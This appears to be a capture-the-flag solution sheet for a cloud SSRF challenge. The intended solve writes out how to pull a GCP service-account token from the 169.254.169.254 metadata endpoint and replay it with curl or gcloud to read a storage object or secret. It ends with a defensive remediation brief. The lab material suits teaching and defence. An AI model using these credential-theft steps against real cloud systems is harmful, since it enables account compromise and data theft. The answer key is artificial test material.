# i01 — Metadata Skim (Ape Ride)

**Category:** Cloud / SSRF → Metadata token · **Difficulty:** Intermediate · **Points:** 300 (dynamic)

## Intended solve
```sh
# The driver-doc previewer fetches a URL you supply, server-side, from inside GCP.
# 1) Reach the metadata server and pull the VM/service-account access token:
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
#    (the app adds Metadata-Flavor: Google for you)
#    -> {"access_token":"ya29....","expires_in":...}

# 2) Also read which SA / scopes you have:
#    .../service-accounts/default/email  and  .../scopes

# 3) USE the token (this is the step up from Phase 1 ch.04): call a Google API directly.
TOKEN=ya29....
curl -H "Authorization: Bearer $TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/<bucket>/o/flag.txt?alt=media"   # CYPHER{...}
# or: gcloud secrets versions access latest --secret=<name> using the token
```
Reading a metadata *attribute* is easy; here you must take the **token** and turn it into an API
call that reads the object the token is scoped to.

## Infra & safety
- Per-team SSRF app on a GCE VM whose service account is **scoped to exactly one** object/secret
  holding that team's flag — never project-wide. Reading metadata yields a token that reaches
  only that single resource.
- No impersonation from here (that is h01). One hop, token → one read.

## Remediation (Blue Team Brief)
Block egress to `169.254.169.254` from app workloads; allow-list fetch targets; never auto-add
`Metadata-Flavor`; use GKE metadata concealment / Workload Identity; scope every SA to the
minimum resource so a stolen token is nearly worthless.
